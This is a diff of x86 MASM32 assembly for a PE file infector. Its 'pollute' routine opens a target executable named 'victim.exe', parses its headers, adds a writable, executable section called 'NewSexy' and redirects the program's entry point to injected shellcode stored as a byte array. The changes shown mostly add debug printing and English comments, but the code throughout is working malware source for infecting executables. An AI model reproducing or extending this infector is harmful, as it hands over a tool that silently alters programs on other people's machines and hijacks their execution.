@@ -17,21 +17,36 @@ includelib c:\masm32\lib\msvcrt.lib
 shellcode 										db 33h, 192, 66h, 184,37h, 13h, 50h , 184, 42h, 24h, 80h, 7ch,  255, 208,  233,0 
 patOnError 									db "Errorz", 13, 10, 0
 patOnSuccess 									db "Success", 13, 10, 0
-patSectionVirtualSize								db "Section->VirtualSize : ", 0
 patNameOfFile									db "Polluting file: ", 0
 patNewLine									db 13,10,0
-patNumberOfSections								db "Number of sections: ", 0
+
+patAddrImageDosHeader							db "Address of IMAGE DOS HEADER: ", 0
+patImageDosHeader								db "IMAGE DOS_HEADER: ", 0
+
+patAddrImageNtHeader							db "Address of IMAGE_NT_HEADER: ", 0
+patImageNtHeader								db "IMAGE_NT_HEADER: ", 0
+
 patAddrNumberOfSections							db "Address of Number of Sections: ", 0
+patNumberOfSections								db "Number of sections: ", 0
+
+
 patAddrImageSectionHeader						db "Address of ImageSectionHeader: ", 0
+patImageSectionHeader							db "Image Section Header: ", 0
+
+patSizeOfSection								db "Size of Section: ", 0
+patSectionAlignment								db "SectionAlignment: " , 0
+
 patNewSectionVirtualAddr							db "New Section Virtual Address: ", 0
 patSizeOfRawData								db "Size of Raw Data: ", 0
+patSectionVirtualSize								db "Section->VirtualSize : ", 0
+
 
 patPutPtr 										db "%p addr",13,10, 0
 patPutInt 										db "%i deci",13,10, 0
 patPutHexa									db "%x hexa", 13, 10, 0
 patPutStr 										db "%s string",13,10, 0
 
-filename 										db  "toto.exe", 0
+filename 										db  "victim.exe", 0
 sectionName 									db "NewSexy", 0
 shellcodeNop									db "\x90", 0
 
@@ -104,10 +119,11 @@ alignOn	endp
 
 pollute proc   filename1 : DWORD
 
-
+;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 invoke	crt_printf, offset patNameOfFile
 invoke	crt_printf, filename1
 invoke	crt_printf, offset patNewLine
+;;;;;;;;;;;;; END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
 ; Opens file for both read and write                                                                                                                                                                   
 mov	eax, GENERIC_WRITE
@@ -134,13 +150,26 @@ assume	ebx: ptr IMAGE_DOS_HEADER
 cmp	[ebx].e_magic, IMAGE_DOS_SIGNATURE
 jne		exiterror
 
-;infosPE = (PIMAGE_NT_HEADERS)((PUCHAR)infosExecutable + infosExecutable->e_lfanew);
+;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+invoke	crt_printf, offset patAddrImageDosHeader
+invoke	crt_printf, offset patPutPtr, ebx
+invoke	crt_printf, offset patImageDosHeader
+invoke	crt_printf, offset patPutPtr, [ebx]
+;;;;;;;;;;;;; END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
 ; ebx += [ebx].e_lfanew
-;; on pointe vers IMAGE_NT_HEADER
+; we point now on IMAGE_NT_HEADER
 add		ebx, [ebx].e_lfanew
 assume	ebx: ptr IMAGE_NT_HEADERS
 cmp	[ebx].Signature,  IMAGE_NT_SIGNATURE
 jne		exiterror
+
+;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+invoke	crt_printf, offset patAddrImageNtHeader
+invoke	crt_printf, offset patPutPtr, ebx
+invoke	crt_printf, offset patImageNtHeader
+invoke	crt_printf, offset patPutPtr, [ebx]
+;;;;;;;;;;;;;;; END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
 ;PDWORD ptrEntryPoint = &infosPE->OptionalHeader.AddressOfEntryPoint;
 ; esi = OptionalHeader
@@ -196,34 +225,30 @@ call		crt_printf
 
 ;addr IMAGE_SECTION_HEADER  = addr IMAGE_NT_HEADERS + sizeof(IMAGE_NT_HEADERS)
 ;PIMAGE_SECTION_HEADER infosSection = (PIMAGE_SECTION_HEADER)((PUCHAR)infosPE + sizeof(IMAGE_NT_HEADERS));
-invoke	crt_printf, offset patAddrImageSectionHeader
 add		ebx, sizeof IMAGE_NT_HEADERS
-push	ebx
-push	offset patPutPtr
-call		crt_printf
 
-push	[ebx]
-push	offset patPutPtr
-call		crt_printf
+;;;;;;;;;;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+invoke	crt_printf, offset patAddrImageSectionHeader
+invoke	crt_printf, offset patPutPtr, ebx
+invoke	crt_printf, offset patImageSectionHeader
+mov 	eax, [ebx]
+invoke	crt_printf, offset patPutPtr, eax
+;;;;;;;;;;;;;;;;;;END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
-;    infosSection = (PIMAGE_SECTION_HEADER)((PUCHAR)infosSection + ( (sizeof(IMAGE_SECTION_HEADER) ) * (infosPE->FileHeader.NumberOfSections) ) );
+
+;infosSection = (PIMAGE_SECTION_HEADER)((PUCHAR)infosSection + ( (sizeof(IMAGE_SECTION_HEADER) ) * (infosPE->FileHeader.NumberOfSections) ) );
 ; ebx  pointe sur la fin des secitons headers
 mov 	eax, sizeof IMAGE_SECTION_HEADER
 mul 	nombreDeSection
 add		ebx, eax
 
-push 	eax
-push 	offset patPutInt
-call		crt_printf
-
-push 	ebx
-push 	offset patPutPtr
-call		crt_printf
-
-
-push 	[ebx]
-push 	offset patPutPtr
-call		crt_printf
+;;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+invoke	crt_printf, offset patAddrImageSectionHeader
+invoke	crt_printf, offset patPutPtr, ebx
+invoke	crt_printf, offset patImageSectionHeader
+mov	eax, [ebx]
+invoke	crt_printf, offset patPutPtr, eax
+;;;;;;;;;;;;;;;;;;;;;;END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
 ; on peut  maintenant setter notre nouvelle section
 
@@ -244,20 +269,28 @@ push 	offset sectionName
 push	ebx 
 call		crt_strcpy
 
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;a tester;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-;notreSection->Misc.VirtualSize = AligneSur(sectionAlignment,tailleSection);
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;to test;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;ournewSection->Misc.VirtualSize = AligneSur(sectionAlignment,tailleSection);
+
+;;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+invoke	crt_printf, offset patSizeOfSection
 invoke	crt_printf, offset patPutInt, tailleSection
+invoke	crt_printf, offset patSectionAlignment
 invoke	crt_printf, offset patPutInt, sectionAlignment
+;;;;;;;;;;;;;;END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
 push	tailleSection
 push 	sectionAlignment
 call		alignOn
 mov	 [ebx].Misc, eax
+
+;;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 invoke	crt_printf, offset patSectionVirtualSize
 invoke 	crt_printf, offset patPutHexa, [ebx].Misc
+;;;;;;;;;;;;;; END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
 
-;   notreSection->VirtualAddress = AligneSur(sectionAlignment,(infosSection->VirtualAddress + infosSection->Misc.VirtualSize));
+;   ournewSection->VirtualAddress = AligneSur(sectionAlignment,(infosSection->VirtualAddress + infosSection->Misc.VirtualSize));
 mov	ecx, ebx
 sub		ecx, sizeof IMAGE_SECTION_HEADER
 assume	ecx: ptr IMAGE_SECTION_HEADER
@@ -268,8 +301,11 @@ push	sectionAlignment
 call		alignOn
 mov	[ebx].VirtualAddress, eax
 
+;;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 invoke	crt_printf, offset patNewSectionVirtualAddr
 invoke	crt_printf, offset patPutHexa, [ebx].VirtualAddress
+;;;;;;;;;;;;;;END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
 
 ;    notreSection->SizeOfRawData = AligneSur(fileAlignment,tailleSection);
 push	tailleSection
@@ -277,8 +313,10 @@ push	fileAlignment
 call		alignOn
 mov 	[ebx].SizeOfRawData, eax 
 
+;;;;;;;;;;;;;;DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 invoke	crt_printf, offset patSizeOfRawData 
 invoke	crt_printf, offset patPutHexa, [ebx].SizeOfRawData
+;;;;;;;;;;;;;;END DEBUG;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
 ;    notreSection->PointerToRawData = AligneSur(fileAlignment,(infosSection->SizeOfRawData + infosSection->PointerToRawData));
 mov	ecx, ebx
@@ -304,7 +342,7 @@ add		eax, IMAGE_SCN_MEM_WRITE
 add		eax, IMAGE_SCN_MEM_EXECUTE
 mov	[ebx].Characteristics,  eax
 
-   ; *ptrEntryPoint = notreSection->VirtualAddress;
+; *ptrEntryPoint = notreSection->VirtualAddress;
 mov	 eax, [ebx].Misc
 mov	ptrEntryPoint, eax
 
@@ -363,7 +401,5 @@ pop		ecx
 invoke	CloseHandle, filePointer
 ret
 pollute endp
-
-
 
 end start
